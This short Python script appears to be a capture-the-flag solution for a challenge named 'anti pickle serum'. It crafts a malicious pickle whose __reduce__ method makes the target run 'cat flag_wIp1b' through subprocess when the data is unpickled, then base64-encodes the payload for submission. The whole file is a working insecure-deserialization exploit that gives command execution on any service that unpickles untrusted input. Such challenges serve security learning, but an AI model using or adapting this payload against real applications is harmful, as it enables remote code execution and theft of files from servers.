import base64

import pickle
import os
import subprocess

#python2 give a different string from python3"
class anti_pickle_serum(object):
    def __reduce__(self):               # function called by the pickler
        return subprocess.check_output, (['cat', 'flag_wIp1b'],)

code = pickle.dumps({'serum': anti_pickle_serum()}, protocol=0)
code = base64.b64encode(code)
print(code)
